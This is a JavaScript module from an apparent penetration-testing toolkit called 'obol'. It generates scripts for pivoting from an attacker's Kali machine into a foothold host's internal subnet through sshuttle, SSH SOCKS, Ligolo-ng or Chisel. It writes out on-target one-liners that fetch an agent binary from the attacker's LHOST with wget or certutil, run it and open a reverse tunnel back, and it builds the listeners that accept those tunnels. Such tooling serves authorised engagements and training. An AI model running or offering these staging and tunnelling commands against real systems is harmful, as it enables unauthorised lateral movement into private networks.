/*!
 * obol engine - pivotkit.js - the Pivot Station (OBOL.pivotkit). Pure, Node-safe, tested.
 *
 * Ports obol's TRANSPORT_HALVES: for each tunnel transport, which half runs LOCALLY (on your Kali
 * box) and which runs ON THE TARGET. obol writes BOTH halves, filled from the engagement (your LHOST,
 * the foothold host, the discovered internal subnet, any SSH credential); you run the local .sh and
 * paste the on-host one-liner onto the target. obol never touches the target. Transport is auto-chosen
 * from the facts (an SSH credential -> sshuttle; a foothold plus a stageable agent -> ligolo/chisel) and
 * is overridable. Locate-first: the subnet comes from scan.local.routes/interfaces (paste `ip route`
 * from the foothold into Evidence and it fills). House style: no em or en dashes.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  // Each transport: where each half runs, how to build them, what it needs, and the install hint.
  var TRANSPORTS = [
    {
      id: 'sshuttle', label: 'sshuttle', needs: 'ssh', bin: 'sshuttle', requires: ['PIVOT', 'SUBNET'],
      teach: 'A VPN-like tunnel over plain SSH. All local, nothing to stage on the target. The simplest pivot when you have SSH creds.',
      install: 'sudo apt install -y sshuttle',
      setup: function () { return []; },
      // sshuttle IS the tunnel and must stay in the foreground; routing is automatic.
      server: function (c) { return 'sshuttle -r ' + sshTarget(c) + ' ' + c.subnet + ' -x ' + c.pivotHost + ' --dns'; },
      proxychains: false,
      onhost: function () { return []; },
    },
    {
      id: 'ssh-dynamic', label: 'SSH dynamic (SOCKS)', needs: 'ssh', bin: 'ssh', requires: ['PIVOT'],
      teach: 'An SSH dynamic port-forward (a SOCKS proxy). All local; point proxychains at 127.0.0.1:1080.',
      install: 'ssh is already on Kali; set a "socks5 127.0.0.1 1080" line in /etc/proxychains4.conf',
      setup: function () { return []; },
      // -N (no command) kept in the foreground so you can Ctrl-C to tear the tunnel down.
      server: function (c) { return 'ssh -D 1080 -N ' + sshTarget(c); },
      proxychains: true,
      onhost: function () { return []; },
    },
    {
      id: 'ligolo', label: 'Ligolo-ng', needs: 'agent', bin: 'ligolo-proxy', requires: ['LHOST', 'SUBNET'],
      teach: 'A fast userland tunnel with a real tun interface, so your tools reach the subnet with no proxychains. Stage the agent on the target.',
      install: 'Download ligolo-proxy and the agent from the ligolo-ng releases (or the Loadout stages them).',
      // tun + route are set up first; the proxy then runs in the FOREGROUND as its interactive console.
      setup: function (c) { return [
        'sudo ip tuntap add user "$(whoami)" mode tun ligolo 2>/dev/null || true',
        'sudo ip link set ligolo up',
        'sudo ip route replace ' + c.subnet + ' dev ligolo',
      ]; },
      consoleSteps: ['run the agent on the target (the on-host line above)', 'in the ligolo console below type:  session   (pick the agent)', 'then type:  start'],
      server: function (c) { return 'ligolo-proxy -selfcert -laddr 0.0.0.0:' + c.port; },
      proxychains: false,
      onhost: function (c) { return [agentStage(c, 'linux'), './agent -connect ' + c.lhost + ':' + c.port + ' -ignore-cert']; },
      onhostWin: function (c) { return [agentStage(c, 'windows'), '.\\agent.exe -connect ' + c.lhost + ':' + c.port + ' -ignore-cert']; },
    },
    {
      id: 'chisel', label: 'Chisel', needs: 'agent', bin: 'chisel', requires: ['LHOST'],
      teach: 'A reliable reverse SOCKS tunnel over HTTP. Server local (foreground), client on the target; use proxychains to reach the subnet.',
      install: 'sudo apt install -y chisel  # or download the matching client for the target OS',
      setup: function () { return []; },
      // the server stays in the foreground to accept the reverse client and hold the tunnel open.
      server: function (c) { return 'chisel server -p ' + c.port + ' --reverse'; },
      proxychains: true,
      onhost: function (c) { return [agentStage(c, 'linux', 'chisel'), './chisel client ' + c.lhost + ':' + c.port + ' R:1080:socks']; },
      onhostWin: function (c) { return [agentStage(c, 'windows', 'chisel.exe'), '.\\chisel.exe client ' + c.lhost + ':' + c.port + ' R:1080:socks']; },
    },
  ];

  function sshTarget(c) { return (c.sshUser || 'user') + '@' + (c.pivotHost || 'TARGET'); }
  // The "get the agent onto the target" line (serve it from your box, pull it on the target).
  function agentStage(c, osName, bin) {
    bin = bin || 'agent';
    if (osName === 'windows') {
      // Must save WITH the .exe extension, or the `.\agent.exe -connect` line below fails with
      // "not recognized as an internal or external command" (certutil keeps whatever name you give it).
      var winBin = /\.exe$/i.test(bin) ? bin : (bin + '.exe');
      var wurl = 'http://' + (c.lhost || 'LHOST') + ':8000/' + winBin;
      return 'certutil -urlcache -f ' + wurl + ' ' + winBin + '   # serve it: python3 -m http.server 8000';
    }
    var url = 'http://' + (c.lhost || 'LHOST') + ':8000/' + bin;
    return 'wget ' + url + ' -O ' + bin + ' && chmod +x ' + bin + '   # serve it: python3 -m http.server 8000';
  }

  function transports() { return TRANSPORTS.slice(); }
  function transportById(id) { return TRANSPORTS.filter(function (t) { return t.id === id; })[0] || null; }

  // Auto-pick a transport from the facts: an SSH credential path -> sshuttle; else a foothold with a
  // stageable agent -> ligolo (default) or chisel. factKinds is an array of fact kind strings.
  function selectTransport(factKinds) {
    var k = {};
    if (Array.isArray(factKinds)) factKinds.forEach(function (x) { k[x] = 1; });
    else if (factKinds && typeof factKinds === 'object') k = factKinds; // kinds() returns an object-set
    var hasSsh = (k['service.ssh'] || k['ssh.reachable'] || k['port:22']) && (k['credential.available'] || k['credential.validated'] || k['credential.plaintext']);
    if (hasSsh) return 'sshuttle';
    return 'ligolo';
  }

  // ctx the kit fills from: {lhost, pivotHost, sshUser, subnet, port, os}
  function ctxDefaults(ctx) {
    ctx = ctx || {};
    return {
      lhost: ctx.lhost || 'LHOST',
      pivotHost: ctx.pivotHost || 'FOOTHOLD',
      sshUser: ctx.sshUser || 'user',
      subnet: ctx.subnet || '10.10.10.0/24',
      port: String(ctx.port || '11601'),
      os: ctx.os || 'linux',
    };
  }

  // localKit(transportId, ctx) -> the downloadable local-half .sh (install preamble gated behind a
  // visible prompt, the transport's local commands, and a liveness reminder).
  function localKit(transportId, ctx) {
    var t = transportById(transportId) || TRANSPORTS[0];
    var c = ctxDefaults(ctx);
    var bin = t.bin || t.id;
    function echo(s) { return 'echo "' + String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\$/g, '\\$') + '"'; }
    var L = [];
    L.push('#!/usr/bin/env bash');
    L.push('# obol Pivot Station: the LOCAL half of a ' + t.label + ' tunnel. Run this on your Kali box.');
    L.push('# obol wrote this and the on-host half; you run both. obol never touches the target.');
    L.push('set -u');
    L.push('LHOST="' + c.lhost + '"; PIVOT="' + c.pivotHost + '"; SUBNET="' + c.subnet + '"; PORT="' + c.port + '"');
    L.push('');
    // guard ONLY the vars this transport actually uses, so an SSH SOCKS tunnel (needs just the foothold)
    // does not abort on an unset LHOST or SUBNET it never references.
    var reqVars = (t.requires && t.requires.length) ? t.requires : ['LHOST', 'PIVOT', 'SUBNET'];
    L.push('for v in ' + reqVars.join(' ') + '; do');
    L.push('  case "${!v}" in LHOST|PIVOT|SUBNET|FOOTHOLD|"") echo "[!] $v is not set, fill it in the Pivot Station and re-download."; exit 1;; esac');
    L.push('done');
    L.push('');
    // VPN Drift Detection (tun0)
    L.push('LIVE_TUN=$(ip -4 -o addr show dev tun0 2>/dev/null | awk \'{print $4}\' | cut -d/ -f1 | head -n1)');
    L.push('if [ -n "$LIVE_TUN" ] && [ "$LIVE_TUN" != "$LHOST" ] && [ "$LHOST" != "LHOST" ]; then');
    L.push('  echo "[*] VPN drift detected: updating LHOST from $LHOST to $LIVE_TUN"');
    L.push('  LHOST="$LIVE_TUN"');
    L.push('fi');
    L.push('');
    // Local Subnet Clash Guard
    if (reqVars.indexOf('SUBNET') >= 0) {
      L.push('if [ -n "$SUBNET" ] && [ "$SUBNET" != "SUBNET" ]; then');
      L.push('  CLASH=$(ip -4 route show "$SUBNET" 2>/dev/null | grep -v \'dev ligolo\' || true)');
      L.push('  if [ -n "$CLASH" ]; then');
      L.push('    echo "[!] Warning: $SUBNET overlaps a local interface route: $CLASH"');
      L.push('  fi');
      L.push('fi');
      L.push('');
    }
    // Upfront sudo -v priming and cleanup trap for ligolo
    if (t.id === 'ligolo') {
      L.push('sudo -v');
      L.push('cleanup() {');
      L.push('  echo "[*] Cleaning up ligolo route and interface..."');
      L.push('  sudo ip route del "$SUBNET" dev ligolo 2>/dev/null || true');
      L.push('  sudo ip link set ligolo down 2>/dev/null || true');
      L.push('}');
      L.push('trap cleanup EXIT INT TERM');
      L.push('');
    }
    L.push('if ! command -v ' + bin + ' >/dev/null 2>&1; then');
    L.push('  echo "[!] ' + bin + ' not found. Install it:"');
    L.push('  ' + echo('    ' + t.install));
    L.push('  read -r -p "Continue once it is installed? [y/N] " a; [ "$a" = y ] || exit 1');
    L.push('fi');
    L.push(echo('[*] ' + t.label + ' local half: LHOST=' + c.lhost + '  PIVOT=' + c.pivotHost + '  SUBNET=' + c.subnet + '  PORT=' + c.port));
    (t.setup ? t.setup(c) : []).forEach(function (line) { L.push(line); });
    // Isolated Proxychains Config (chisel and ssh-dynamic)
    if (t.proxychains) {
      L.push('cat << \'EOF\' > ./.obol-proxychains.conf');
      L.push('strict_chain');
      L.push('proxy_dns');
      L.push('[ProxyList]');
      L.push('socks5 127.0.0.1 1080');
      L.push('EOF');
    }
    // print the ON-HOST half before we hand the terminal to the (foreground) server.
    var onh = onHostLines(t.id, c, c.os);
    if (onh.length) {
      L.push(echo(''));
      L.push(echo('[*] Run the ON-HOST half on the target now (copy it from the Pivot Station):'));
      onh.forEach(function (line) { L.push(echo('    ' + line)); });
    }
    if (t.consoleSteps && t.consoleSteps.length) {
      L.push(echo(''));
      L.push(echo('[*] Then, in order:'));
      t.consoleSteps.forEach(function (s, i) { L.push(echo('    ' + (i + 1) + '. ' + s)); });
    }
    if (t.proxychains) {
      L.push(echo(''));
      L.push(echo('[*] Isolated proxychains config written to ./.obol-proxychains.conf'));
      L.push(echo('[*] Reach the subnet with:  proxychains4 -f ./.obol-proxychains.conf nmap -sT -Pn -p 445 <internal-host>'));
    } else {
      L.push(echo(''));
      L.push(echo('[*] Reach the subnet directly:  nmap -sT -Pn -p 445 <internal-host>  (routed over the tunnel)'));
    }
    L.push(echo(''));
    L.push(echo('[*] Copy and paste this line into Obol Evidence once connected:'));
    L.push('echo "    obol:fact:pivot_active | subnet=$SUBNET | via=' + t.id + ' | host=$PIVOT"');
    L.push(echo(''));
    L.push(echo('[*] Starting ' + t.label + '. Keep this window open, it IS the tunnel. Ctrl-C to tear it down.'));
    // the server runs in the FOREGROUND so the tunnel (and, for ligolo, its console) stays alive.
    L.push('exec ' + t.server(c));
    return L.join('\n') + '\n';
  }

  // onHostLines(transportId, ctx, os) -> the commands to paste on the target (copy chips). Empty for
  // the all-local SSH transports.
  function onHostLines(transportId, ctx, osName) {
    var t = transportById(transportId) || TRANSPORTS[0];
    var c = ctxDefaults(ctx);
    if (osName === 'windows' && t.onhostWin) return t.onhostWin(c);
    return t.onhost ? t.onhost(c) : [];
  }

  // Detect target OS ('linux', 'windows', or 'auto') from a factKinds set/array.
  function detectTargetOs(factKinds) {
    var k = {};
    if (Array.isArray(factKinds)) factKinds.forEach(function (x) { k[x] = 1; });
    else if (factKinds && typeof factKinds === 'object') k = factKinds;
    if (k['foothold.windows'] || k['os.windows'] || k['winrm.authenticated'] || k['rdp.authenticated']) return 'windows';
    if (k['foothold.linux'] || k['os.linux']) return 'linux';
    return 'auto';
  }

  // autoKit(ctx, factKinds) -> Zero-config self-selecting tunnel script (.sh) for Kali.
  // Automatically detects tun0 LHOST, picks the first free egress port on Kali, and tries transports
  // in best-available order at runtime:
  //   1. sshuttle (if SSH credentials/access exist for the foothold and sshuttle + subnet are present)
  //   2. ligolo-ng (if ligolo-proxy is in PATH or ~/.cache/obol/bin and subnet is present)
  //   3. chisel (if chisel is in PATH or ~/.cache/obol/bin, with isolated .obol-proxychains.conf)
  //   4. ssh -D 1080 dynamic SOCKS (if SSH access exists)
  function autoKit(ctx, factKinds) {
    var c = ctxDefaults(ctx);
    var k = {};
    if (Array.isArray(factKinds)) factKinds.forEach(function (x) { k[x] = 1; });
    else if (factKinds && typeof factKinds === 'object') k = factKinds;
    var hasSsh = !!((k['service.ssh'] || k['ssh.reachable'] || k['port:22']) && (k['credential.available'] || k['credential.validated'] || k['credential.plaintext'] || k['credential.ssh_key']));
    var L = [
      '#!/usr/bin/env bash',
      '# obol Auto-Pivot Script: Zero-config local tunnel launcher for Kali.',
      '# Automatically detects tun0 LHOST, finds a free port, and selects the best available tunnel',
      '# (sshuttle -> Ligolo-ng -> Chisel -> SSH SOCKS). Run in a dedicated terminal pane.',
      'set -u',
      'export PATH="$HOME/.cache/obol/bin:$HOME/.local/bin:$PATH"',
      '',
      'LHOST="' + c.lhost + '"',
      'PIVOT="' + c.pivotHost + '"',
      'SSH_USER="' + c.sshUser + '"',
      'SUBNET="' + c.subnet + '"',
      'PREF_PORT="' + c.port + '"',
      'HAS_SSH="' + (hasSsh ? '1' : '0') + '"',
      '',
      '# 1. Auto-detect live VPN tun0 IP if LHOST is unset or drifted',
      'LIVE_TUN=$(ip -4 -o addr show dev tun0 2>/dev/null | awk \'{print $4}\' | cut -d/ -f1 | head -n1)',
      'if [ -n "$LIVE_TUN" ]; then',
      '  if [ "$LHOST" = "LHOST" ] || [ -z "$LHOST" ]; then',
      '    LHOST="$LIVE_TUN"',
      '    echo "[*] Auto-detected LHOST from tun0: $LHOST"',
      '  elif [ "$LIVE_TUN" != "$LHOST" ]; then',
      '    echo "[*] VPN drift detected: updating LHOST from $LHOST to $LIVE_TUN"',
      '    LHOST="$LIVE_TUN"',
      '  fi',
      'fi',
      '',
      '# 2. Auto-select first free local port for reverse agent transports',
      'PORT="$PREF_PORT"',
      'for candidate in "$PREF_PORT" 11601 443 8443 8080 53; do',
      '  if ! ss -tuln 2>/dev/null | grep -qE ":${candidate}[[:space:]]"; then',
      '    PORT="$candidate"',
      '    break',
      '  fi',
      'done',
      '',
      '# 3. Check for local subnet route overlap',
      'if [ -n "$SUBNET" ] && [ "$SUBNET" != "SUBNET" ]; then',
      '  CLASH=$(ip -4 route show "$SUBNET" 2>/dev/null | grep -v \'dev ligolo\' || true)',
      '  if [ -n "$CLASH" ]; then',
      '    echo "[!] Warning: $SUBNET overlaps an existing local route: $CLASH"',
      '  fi',
      'fi',
      '',
      '# 4. Auto-select best transport: sshuttle (if SSHknown) -> Ligolo-ng -> Chisel -> SSH SOCKS',
      'if [ "$HAS_SSH" = "1" ] && [ "$PIVOT" != "FOOTHOLD" ] && [ -n "$SUBNET" ] && command -v sshuttle >/dev/null 2>&1; then',
      '  echo "[*] Auto-selected transport: sshuttle (SSH credentials available, no target agent needed)"',
      '  echo "[*] Copy and paste this line into Obol Cruise/Evidence once connected:"',
      '  echo "    obol:fact:pivot_active | subnet=$SUBNET | via=sshuttle | host=$PIVOT"',
      '  echo "[*] Starting sshuttle for $SUBNET via $SSH_USER@$PIVOT (Ctrl-C to stop)..."',
      '  exec sshuttle -r "$SSH_USER@$PIVOT" "$SUBNET" -x "$PIVOT" --dns',
      'fi',
      '',
      'if command -v ligolo-proxy >/dev/null 2>&1 && [ -n "$SUBNET" ]; then',
      '  echo "[*] Auto-selected transport: Ligolo-ng (tun interface on port $PORT)"',
      '  sudo -v',
      '  cleanup() {',
      '    echo "[*] Cleaning up ligolo route and interface..."',
      '    sudo ip route del "$SUBNET" dev ligolo 2>/dev/null || true',
      '    sudo ip link set ligolo down 2>/dev/null || true',
      '  }',
      '  trap cleanup EXIT INT TERM',
      '  sudo ip tuntap add user "$(whoami)" mode tun ligolo 2>/dev/null || true',
      '  sudo ip link set ligolo up',
      '  sudo ip route replace "$SUBNET" dev ligolo',
      '  echo ""',
      '  echo "[*] Run the ON-HOST agent command on the target ($PIVOT):"',
      '  echo "    Linux  : wget http://$LHOST:8000/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $LHOST:$PORT -ignore-cert"',
      '  echo "    Windows: certutil -urlcache -f http://$LHOST:8000/agent.exe agent.exe && .\\\\agent.exe -connect $LHOST:$PORT -ignore-cert"',
      '  echo ""',
      '  echo "[*] In the ligolo console below type:  session  -> then type:  start"',
      '  echo "[*] Copy and paste this line into Obol Cruise/Evidence once connected:"',
      '  echo "    obol:fact:pivot_active | subnet=$SUBNET | via=ligolo | host=$PIVOT"',
      '  echo ""',
      '  exec ligolo-proxy -selfcert -laddr "0.0.0.0:$PORT"',
      'fi',
      '',
      'if command -v chisel >/dev/null 2>&1; then',
      '  echo "[*] Auto-selected transport: Chisel Reverse SOCKS5 (port $PORT -> 127.0.0.1:1080)"',
      '  cat << \'EOF\' > ./.obol-proxychains.conf',
      'strict_chain',
      'proxy_dns',
      '[ProxyList]',
      'socks5 127.0.0.1 1080',
      'EOF',
      '  echo ""',
      '  echo "[*] Run the ON-HOST chisel client on the target ($PIVOT):"',
      '  echo "    Linux  : wget http://$LHOST:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel && /tmp/chisel client $LHOST:$PORT R:1080:socks"',
      '  echo "    Windows: certutil -urlcache -f http://$LHOST:8000/chisel.exe chisel.exe && .\\\\chisel.exe client $LHOST:$PORT R:1080:socks"',
      '  echo ""',
      '  echo "[*] Reach internal hosts with: proxychains4 -f ./.obol-proxychains.conf <command>"',
      '  echo "[*] Copy and paste this line into Obol Cruise/Evidence once connected:"',
      '  echo "    obol:fact:pivot_active | subnet=$SUBNET | via=chisel | host=$PIVOT"',
      '  echo ""',
      '  exec chisel server -p "$PORT" --reverse',
      'fi',
      '',
      'if [ "$PIVOT" != "FOOTHOLD" ]; then',
      '  echo "[*] Falling back to SSH Dynamic SOCKS5 proxy on 127.0.0.1:1080..."',
      '  cat << \'EOF\' > ./.obol-proxychains.conf',
      'strict_chain',
      'proxy_dns',
      '[ProxyList]',
      'socks5 127.0.0.1 1080',
      'EOF',
      '  echo "    obol:fact:pivot_active | subnet=$SUBNET | via=ssh-dynamic | host=$PIVOT"',
      '  exec ssh -D 1080 -N "$SSH_USER@$PIVOT"',
      'fi',
      '',
      'echo "[!] Neither ligolo-proxy, chisel, nor sshuttle was found. Run the Obol Loadout script or: sudo apt install -y sshuttle chisel"',
      'exit 1',
    ];
    return L.join('\n') + '\n';
  }

  OBOL.pivotkit = {
    transports: transports, transportById: transportById, selectTransport: selectTransport,
    localKit: localKit, autoKit: autoKit, detectTargetOs: detectTargetOs,
    onHostLines: onHostLines, ctxDefaults: ctxDefaults,
  };
})(typeof globalThis !== 'undefined' ? globalThis : this);
